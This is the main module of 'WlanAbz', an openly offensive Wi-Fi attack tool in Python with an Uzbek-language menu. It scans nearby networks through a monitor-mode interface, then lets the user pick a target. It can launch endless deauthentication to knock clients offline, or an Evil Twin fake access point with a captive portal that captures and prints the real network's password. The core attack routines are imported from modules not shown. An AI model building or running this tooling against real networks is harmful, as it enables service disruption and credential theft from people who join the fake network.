#!/usr/bin/env python3
"""
WlanAbz — Wi-Fi Scanner & Attack Tool by Abz

Asosiy dastur moduli (menyu, skaner, UI, animatsiya).
Ishga tushirish:  sudo python3 main.py
"""

from __future__ import annotations

import glob
import os
import re
import subprocess
import sys
import threading
import time

import wifi_util as wu

wu.require_root()
print("[*] Paketlar tekshirilmoqda...")
wu.ensure_dependencies(log=lambda m: print(f"  {m}") if m else None)

from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich import box

from deauth_engine import run_infinite_deauth
from eviltwin import EvilTwin

console = Console(highlight=False)

networks = {}
current_mon_iface = None
current_station_iface = None
_active_evil_twin = None

# ═══════════════════════════════════════════════════════
#  LOGO (o'zgartirilmaydi)
# ═══════════════════════════════════════════════════════

BANNER = r"""
 __        ___                _    _         
 \ \      / / | __ _ _ __    / \  | |__ ____ 
  \ \ /\ / /| |/ _` | '_ \  / _ \ | '_ \_  / 
   \ V  V / | | (_| | | | |/ ___ \| |_) / /  
    \_/\_/  |_|\__,_|_| |_/_/   \_\_.__/___| 
"""


def clear():
    os.system("clear" if os.name == "posix" else "cls")


def print_logo():
    console.print(f"[bold bright_cyan]{BANNER}[/bold bright_cyan]")
    console.print("[bold green]" + ("=" * 57) + "[/bold green]")
    console.print(
        "[bold green]       Wi-Fi Scanner & Attack Tool by Abz[/bold green]"
    )
    console.print("[bold green]" + ("=" * 57) + "[/bold green]\n")


def _banner_lines():
    return BANNER.strip("\n").split("\n")


def _term_size():
    try:
        return console.size.width, console.size.height
    except Exception:
        return 80, 24


SUBTITLE = "Wi-Fi Scanner & Attack Tool by Abz"


def _center_block(lines, styles=None, extra_lines=None):
    """
    Blokni terminal markazida chiqarish.
    lines: logo qatorlari
    styles: har bir logo qatori uchun style (yoki bitta style str)
    extra_lines: [(text, style), ...] — logo ostida (taglavha)
    """
    width, height = _term_size()
    extra_lines = extra_lines or []
    block_h = len(lines) + len(extra_lines)
    max_w = max(
        [len(ln) for ln in lines]
        + [len(t) for t, _ in extra_lines]
        + [0]
    )
    left = max(0, (width - max_w) // 2)
    top = max(0, (height - block_h) // 2)
    pad = " " * left

    if isinstance(styles, str) or styles is None:
        styles = [styles or "bold bright_cyan"] * len(lines)

    for _ in range(top):
        console.print()
    for line, st in zip(lines, styles):
        console.print(f"{pad}[{st}]{line}[/{st}]")
    for text, st in extra_lines:
        # har bir extra qatorni o'z kengligi bo'yicha markazlash
        el = max(0, (width - len(text)) // 2)
        console.print(f"{' ' * el}[{st}]{text}[/{st}]")


def intro_animation():
    """
    Boshlang'ich animatsiya (markazda):
      1) logo kattalashib ochiladi
      2) taglavha paydo bo'ladi
      3) flash → dastur
    === ramka yo'q.
    """
    lines = _banner_lines()
    n = len(lines)

    # 1) markazdan vertikal ochilish (faqat logo)
    for step in range(1, n + 1):
        clear()
        start = (n - step) // 2
        end = start + step
        frame = []
        for i, line in enumerate(lines):
            if start <= i < end:
                frame.append(line)
            else:
                frame.append(" " * len(line) if line.strip() else "")
        _center_block(frame)
        time.sleep(0.12)

    # 2) to'liq logo
    clear()
    _center_block(lines)
    time.sleep(0.25)

    # 3) taglavha — harfma-harf (markazda)
    typed = ""
    for ch in SUBTITLE:
        typed += ch
        clear()
        _center_block(
            lines,
            extra_lines=[(typed, "bold green")],
        )
        time.sleep(0.02)

    # 4) flash
    for style in ("bold bright_white", "bold white", "bold bright_cyan"):
        clear()
        _center_block(
            lines,
            styles=style,
            extra_lines=[(SUBTITLE, "bold green")],
        )
        time.sleep(0.14)

    clear()
    _center_block(
        lines,
        extra_lines=[(SUBTITLE, "bold green")],
    )
    time.sleep(0.55)
    clear()


def start():
    """Animatsiya → asosiy menyu."""
    try:
        intro_animation()
    except KeyboardInterrupt:
        clear()
    main()


# ═══════════════════════════════════════════════════════
#  UI — sodda, o'zbekcha
# ═══════════════════════════════════════════════════════

def page(title: str = "", logo: bool = True):
    """Oddiy sahifa. logo=False → faqat kontent (natijalar uchun)."""
    clear()
    if logo:
        print_logo()
    if title:
        console.print(f"[bold white]{title}[/bold white]")
        console.print(f"[bright_black]{'─' * 48}[/bright_black]\n")


def sep():
    console.print(f"[bright_black]{'─' * 48}[/bright_black]")


def ask(prompt: str = "Tanlov") -> str:
    try:
        return console.input(f"\n[bold cyan]  {prompt}: [/bold cyan]").strip()
    except (KeyboardInterrupt, EOFError):
        return ""


def pause(msg: str = "Davom etish uchun Enter"):
    try:
        console.input(f"\n[bright_black]  {msg}...[/bright_black] ")
    except (KeyboardInterrupt, EOFError):
        pass


def ok(msg: str):
    console.print(f"[green]  [+] {msg}[/green]")


def err(msg: str):
    console.print(f"[red]  [-] {msg}[/red]")


def warn(msg: str):
    console.print(f"[yellow]  [!] {msg}[/yellow]")


def _log(msg: str):
    console.print(f"[bright_black]  {msg}[/bright_black]")


def item(num: str, text: str, color: str = "cyan"):
    console.print(f"  [bold {color}]{num}[/bold {color}]   {text}")


def restore_all():
    global _active_evil_twin, current_mon_iface
    if _active_evil_twin is not None:
        try:
            _active_evil_twin.stop()
        except Exception:
            pass
        _active_evil_twin = None
    iface = current_mon_iface or current_station_iface
    page("Tarmoq tiklanmoqda")
    wu.airmon_stop(iface, log=_log)
    current_mon_iface = None
    ok("Tarmoq tiklandi")


# ═══════════════════════════════════════════════════════
#  MONITOR
# ═══════════════════════════════════════════════════════

def pick_and_enable_monitor():
    global current_mon_iface, current_station_iface

    page("Interfeys")

    ifaces = wu.list_wifi_ifaces(include_mon=True)
    stations = []
    for i in ifaces:
        if i.endswith("mon") or wu.iface_type(i) == "monitor":
            s = wu.mon_to_managed(i, log=lambda *_: None)
            if s and s not in stations:
                stations.append(s)
        elif i not in stations:
            stations.append(i)
    if not stations:
        stations = wu.list_wifi_ifaces(include_mon=False)
    if not stations:
        err("Wi-Fi interfeys topilmadi")
        pause()
        return None

    if len(stations) == 1:
        target = stations[0]
        ok(f"Interfeys: {target}")
    else:
        console.print("  Mavjud kartalar:\n")
        for idx, n in enumerate(stations, 1):
            item(str(idx), f"{n}  ({wu.iface_type(n)})")
        try:
            target = stations[int(ask("Raqam")) - 1]
        except (ValueError, IndexError):
            err("Noto'g'ri tanlov")
            pause()
            return None

    current_station_iface = target
    console.print()
    console.print(f"  Monitor yoqilmoqda: [cyan]{target}[/cyan] ...\n")
    mon = wu.airmon_start(target, log=_log)
    if not mon or wu.iface_type(mon) != "monitor":
        err("Monitor yoqilmadi")
        console.print(f"  sudo airmon-ng start {target}")
        pause()
        return None

    current_mon_iface = mon
    wu.set_txpower_max(mon, log=lambda *_: None)
    ok(f"Monitor: {mon}")
    time.sleep(0.4)
    return mon


# ═══════════════════════════════════════════════════════
#  SKANER
# ═══════════════════════════════════════════════════════

def clean_ssid(ssid) -> str:
    s = (ssid or "").strip().strip('"').strip("'")
    while s.endswith(","):
        s = s[:-1].rstrip()
    return s.strip() or "<Yashirin>"


def _merge_network(bssid, ssid, channel, signal, crypto):
    if not bssid:
        return
    bssid = bssid.upper().strip()
    try:
        ch_int = int(channel)
    except (TypeError, ValueError):
        ch_int = channel
    try:
        sig = int(signal)
    except (TypeError, ValueError):
        sig = -100
    if sig > 0:
        sig = -sig
    band = "5 GHz" if isinstance(ch_int, int) and ch_int > 14 else "2.4 GHz"
    ssid = clean_ssid(ssid)
    prev = networks.get(bssid)
    if prev and prev.get("signal", -999) > sig:
        sig = prev["signal"]
        if str(ssid).startswith("<"):
            ssid = prev["ssid"]
    networks[bssid] = {
        "ssid": ssid,
        "channel": ch_int,
        "signal": sig,
        "crypto": str(crypto or "?"),
        "band": band,
    }


def results_table():
    """Faqat natijalar — sodda jadval."""
    t = Table(
        show_header=True,
        header_style="bold white",
        expand=True,
        box=box.SIMPLE_HEAD,
        pad_edge=False,
        show_edge=False,
        padding=(0, 1),
    )
    t.add_column("№", style="bold", width=3, justify="right")
    t.add_column("Wi-Fi nomi", style="bold cyan", min_width=14)
    t.add_column("MAC", style="yellow")
    t.add_column("Kanal", style="green", justify="center", width=5)
    t.add_column("Diapazon", style="blue", justify="center", width=7)
    t.add_column("Signal", justify="right", width=6)
    t.add_column("Himoya", style="magenta")

    for idx, (bssid, info) in enumerate(
        sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True), 1
    ):
        s = info["signal"]
        sc = "green" if s >= -60 else ("yellow" if s >= -75 else "red")
        t.add_row(
            str(idx),
            str(info["ssid"])[:22],
            bssid,
            str(info["channel"]),
            info["band"],
            f"[{sc}]{s}[/{sc}]",
            str(info["crypto"])[:14],
        )
    return t


def live_table(time_left, mode="scan"):
    t = Table(
        title=f"Skaner · {len(networks)} ta · {time_left}s",
        show_header=True,
        header_style="bold cyan",
        expand=True,
        show_edge=False,
        box=box.SIMPLE,
    )
    t.add_column("№", width=3)
    t.add_column("Wi-Fi", min_width=12)
    t.add_column("MAC", style="yellow")
    t.add_column("CH", width=4)
    t.add_column("PWR", width=5)
    for idx, (bssid, info) in enumerate(
        sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True), 1
    ):
        t.add_row(
            str(idx),
            str(info["ssid"])[:18],
            bssid,
            str(info["channel"]),
            str(info["signal"]),
        )
    return t


def _parse_airodump_csv(csv_path: str) -> int:
    if not os.path.isfile(csv_path):
        return 0
    try:
        with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
            raw = f.read()
    except Exception:
        return 0
    ap_block = re.split(r"\n\s*\n", raw)[0]
    added = 0
    for line in ap_block.splitlines():
        line = line.strip()
        if not line or line.lower().startswith("bssid"):
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            continue
        try:
            channel = int(parts[3])
        except ValueError:
            channel = parts[3]
        try:
            power = int(parts[8])
        except ValueError:
            power = -100
        essid = parts[13].strip().strip('"') if len(parts) > 13 else ""
        try:
            id_len = int(parts[12])
            if id_len == 0:
                essid = ""
            elif 0 < id_len < len(essid):
                essid = essid[:id_len]
        except (ValueError, IndexError):
            pass
        crypto = " ".join(x for x in (parts[5], parts[6], parts[7]) if x)
        _merge_network(bssid, essid, channel, power, crypto)
        added += 1
    return added


def _stop_airodump():
    wu.run(["pkill", "-x", "airodump-ng"])
    time.sleep(0.35)


def scan_airodump(mon_iface: str, seconds: int = 30) -> int:
    if not wu.which("airodump-ng"):
        err("airodump-ng yo'q")
        return 0

    if wu.iface_type(mon_iface) != "monitor":
        mon2 = wu.airmon_start(wu.base_name(mon_iface), log=lambda *_: None)
        if mon2:
            mon_iface = mon2
        if wu.iface_type(mon_iface) != "monitor":
            err("Monitor yo'q")
            return 0

    prefix = f"/tmp/wlanabz_scan_{os.getpid()}"
    for p in glob.glob(prefix + "*"):
        try:
            os.remove(p)
        except Exception:
            pass
    csv_path = prefix + "-01.csv"

    dump_cmd = (
        f"airodump-ng --write {prefix} --output-format csv "
        f"--write-interval 1 --band abg {mon_iface}"
    )

    page("Skaner")
    console.print(f"  Interfeys: [cyan]{mon_iface}[/cyan]")
    console.print("  O'ngda airodump oynasi ochiladi.")
    console.print("  Tarmoqlarni ko'rib, shu yerda Enter bosing.\n")

    term_proc = wu.open_side_terminal(
        title=f"airodump · {mon_iface}",
        command=dump_cmd,
        log=_log,
        geometry="105x34-16+48",
    )

    if term_proc is None:
        warn("Yon oyna ochilmadi — shu terminalda skaner")
        return _scan_airodump_inline(mon_iface, prefix, csv_path, seconds)

    ok("Skaner ishlayapti (yon oyna)")
    try:
        ask("To'xtatish uchun Enter")
    except KeyboardInterrupt:
        pass
    finally:
        _stop_airodump()
        if term_proc and term_proc.poll() is None:
            try:
                term_proc.terminate()
            except Exception:
                pass
            try:
                os.killpg(os.getpgid(term_proc.pid), 15)
            except Exception:
                try:
                    term_proc.kill()
                except Exception:
                    pass
        time.sleep(0.5)
        for p in glob.glob(prefix + "*"):
            if p.endswith(".csv"):
                _parse_airodump_csv(p)
            try:
                os.remove(p)
            except Exception:
                pass

    return len(networks)


def _scan_airodump_inline(mon_iface, prefix, csv_path, seconds) -> int:
    err_f = open(prefix + ".err", "w")
    try:
        proc = subprocess.Popen(
            [
                "airodump-ng", "--write", prefix,
                "--output-format", "csv", "--write-interval", "1",
                "--band", "abg", mon_iface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=err_f,
        )
    except Exception as e:
        err_f.close()
        err(str(e))
        return 0
    t0 = time.time()
    try:
        with Live(live_table(seconds), refresh_per_second=2, console=console) as live:
            while time.time() - t0 < seconds:
                if proc.poll() is not None:
                    break
                _parse_airodump_csv(csv_path)
                live.update(live_table(max(0, int(seconds - (time.time() - t0)))))
                time.sleep(0.4)
    except KeyboardInterrupt:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except Exception:
                proc.kill()
        err_f.close()
        time.sleep(0.3)
        _parse_airodump_csv(csv_path)
        for p in glob.glob(prefix + "*"):
            try:
                os.remove(p)
            except Exception:
                pass
    return len(networks)


def scan_scapy(mon_iface: str, seconds: int = 16) -> int:
    before = len(networks)
    try:
        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff, conf
        conf.iface = mon_iface
    except Exception as e:
        warn(f"scapy: {e}")
        return 0

    stop = threading.Event()
    hops = list(wu.CHANNELS_2_4) + list(wu.CHANNELS_5)

    def hopper():
        i = 0
        while not stop.is_set():
            wu.set_channel(mon_iface, hops[i % len(hops)], force_raw=True)
            i += 1
            stop.wait(0.25)

    def on_pkt(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
        except Exception:
            ssid = ""
        dbm = getattr(pkt, "dBm_AntSignal", -100)
        try:
            st = pkt[Dot11Beacon].network_stats()
            ch, crypto = st.get("channel", "?"), st.get("crypto", "?")
        except Exception:
            ch, crypto = "?", "?"
        _merge_network(bssid, ssid, ch, dbm, crypto)

    threading.Thread(target=hopper, daemon=True).start()
    th = threading.Thread(
        target=lambda: sniff(iface=mon_iface, prn=on_pkt, timeout=seconds, store=False),
        daemon=True,
    )
    th.start()
    t0 = time.time()
    try:
        with Live(live_table(seconds, "scapy"), refresh_per_second=3, console=console) as live:
            while time.time() - t0 < seconds and th.is_alive():
                live.update(live_table(max(0, int(seconds - (time.time() - t0))), "scapy"))
                time.sleep(0.3)
    except KeyboardInterrupt:
        pass
    stop.set()
    th.join(timeout=2)
    return len(networks) - before


def scan_networks(mon_iface: str, seconds: int = 32):
    global networks
    networks.clear()

    if wu.iface_type(mon_iface) != "monitor":
        mon2 = wu.airmon_start(wu.base_name(mon_iface), log=lambda *_: None)
        if mon2:
            mon_iface = mon2

    wu.run(["rfkill", "unblock", "all"])
    wu.run(["iw", "reg", "set", "US"])
    wu.set_channel(mon_iface, 6, force_raw=True)

    scan_airodump(mon_iface, seconds=max(22, seconds - 4))
    if not networks:
        page("Qayta urinish")
        warn("Tarmoq topilmadi — boshqa usul bilan...")
        scan_scapy(mon_iface, 16)

    return mon_iface


def show_results_and_pick(mon_iface):
    """
    FAQAT NATIJALAR — logo yo'q, ortiqcha status yo'q.
    """
    clear()  # toza ekran, logo yo'q

    if not networks:
        err("Tarmoq topilmadi")
        pause()
        return None

    # faqat jadval
    console.print()
    console.print(results_table())
    console.print()
    console.print(
        f"  [bright_black]Jami: {len(networks)} ta  ·  "
        f"raqam = tanlash  ·  r = qayta  ·  0 = chiqish[/bright_black]"
    )
    raw = ask("Tarmoq raqami")

    if raw.lower() == "r":
        mon_iface = scan_networks(mon_iface, 28)
        return show_results_and_pick(mon_iface)
    if raw == "0":
        restore_all()
        return None

    sorted_n = sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True)
    try:
        item = sorted_n[int(raw) - 1]
        return target_menu(item[0], item[1], mon_iface)
    except (ValueError, IndexError):
        err("Noto'g'ri raqam")
        pause()
        return show_results_and_pick(mon_iface)


# ═══════════════════════════════════════════════════════
#  HUJUM
# ═══════════════════════════════════════════════════════

def target_menu(bssid, info, mon_iface):
    page("Tanlangan tarmoq")

    console.print(f"  Wi-Fi nomi   [bold cyan]{info['ssid']}[/bold cyan]")
    console.print(f"  MAC          [yellow]{bssid}[/yellow]")
    console.print(
        f"  Kanal        [green]{info['channel']}[/green]  "
        f"[blue]{info['band']}[/blue]"
    )
    console.print(f"  Signal       [magenta]{info['signal']} dBm[/magenta]")
    console.print(f"  Himoya       {info['crypto']}")
    console.print()
    sep()
    console.print()
    item("1", "Uzish (Deauth)", "red")
    item("2", "Soxta Wi-Fi (Evil Twin)", "yellow")
    item("3", "Qayta skaner", "cyan")
    item("4", "Bosh menyu", "green")
    item("0", "Chiqish", "white")

    c = ask("Tanlov")

    if c == "1":
        try:
            ch = int(info["channel"])
        except (TypeError, ValueError):
            ch = 6
        page("Uzish (Deauth)")
        console.print(f"  MAC: [yellow]{bssid}[/yellow]")
        console.print(f"  Kanal: [green]{ch}[/green]")
        console.print("  To'xtatish: Ctrl+C\n")
        wu.set_channel(mon_iface, ch, force_raw=True)
        try:
            run_infinite_deauth(mon_iface, bssid, channel=ch, log=_log)
        except KeyboardInterrupt:
            pass
        ok("To'xtatildi")
        pause()
        return target_menu(bssid, info, mon_iface)

    if c == "2":
        run_evil_twin(bssid, info, mon_iface)
        global current_mon_iface, current_station_iface
        st = wu.resolve_station(current_station_iface or mon_iface, log=lambda *_: None)
        if st:
            current_station_iface = st
            m = wu.airmon_start(st, log=_log)
            if m:
                current_mon_iface = m
                mon_iface = m
        return target_menu(bssid, info, mon_iface)

    if c == "3":
        mon_iface = scan_networks(mon_iface, 28)
        return show_results_and_pick(mon_iface)

    if c == "4":
        restore_all()
        pause()
        return main()

    if c == "0":
        restore_all()
        console.print("\n  Xayr!\n")
        sys.exit(0)

    return target_menu(bssid, info, mon_iface)


def run_evil_twin(bssid, info, mon_iface):
    global _active_evil_twin
    essid = clean_ssid(info.get("ssid") or "Wi-Fi")
    if essid.startswith("<") or not essid:
        essid = "Wi-Fi"
    try:
        real_ch = int(info.get("channel") or 6)
    except (TypeError, ValueError):
        real_ch = 6
    ap_ch = wu.normalize_channel(real_ch)

    page("Soxta Wi-Fi")
    console.print(f"  Wi-Fi nomi   [bold cyan]{essid}[/bold cyan]")
    console.print(f"  MAC          [yellow]{bssid}[/yellow]")
    console.print(f"  AP kanal     [green]{ap_ch}[/green]")
    console.print(f"  Uzish kanal  [green]{real_ch}[/green]")
    console.print(f"  Portal       http://192.168.1.1/")
    console.print()
    console.print("  1) Telefonda haqiqiy Wi-Fi ni unuting")
    console.print("  2) Ochiq (parolsiz) tarmoqqa ulaning")
    console.print("  3) Ctrl+C — to'xtatish")
    console.print()

    twin = EvilTwin(log_callback=_log)
    _active_evil_twin = twin
    try:
        result = twin.run(
            mon_iface=mon_iface,
            essid=essid,
            bssid=bssid,
            channel=ap_ch,
            deauth_channel=real_ch,
            timeout=0,
            continuous_deauth=True,
            ap_essid=essid,
        )
    except KeyboardInterrupt:
        twin.stop()
        result = {"success": False}
    except Exception as e:
        twin.stop()
        result = {"success": False, "error": str(e)}
    finally:
        _active_evil_twin = None

    page("Natija")
    if result.get("success") and result.get("password"):
        ok(f"Parol: {result['password']}")
        if result.get("file"):
            console.print(f"  Fayl: {result['file']}")
    else:
        n = len(result.get("data") or [])
        warn(result.get("error") or "Tugadi")
        console.print(f"  Yuborilgan so'rovlar: {n}")
    pause()


# ═══════════════════════════════════════════════════════
#  BOSH MENYU
# ═══════════════════════════════════════════════════════

def main():
    page()  # logo + bo'sh
    item("1", "Skaner va hujum", "green")
    item("2", "Tarmoqni tiklash", "yellow")
    item("0", "Chiqish", "white")

    c = ask("Tanlov")

    if c == "1":
        mon = pick_and_enable_monitor()
        if not mon:
            return main()
        mon = scan_networks(mon, 32)
        show_results_and_pick(mon)
        return

    if c == "2":
        restore_all()
        pause()
        return main()

    if c == "0":
        console.print("\n  Xayr!\n")
        sys.exit(0)

    return main()


if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        console.print()
        if _active_evil_twin:
            try:
                _active_evil_twin.stop()
            except Exception:
                pass
        restore_all()
        sys.exit(0)
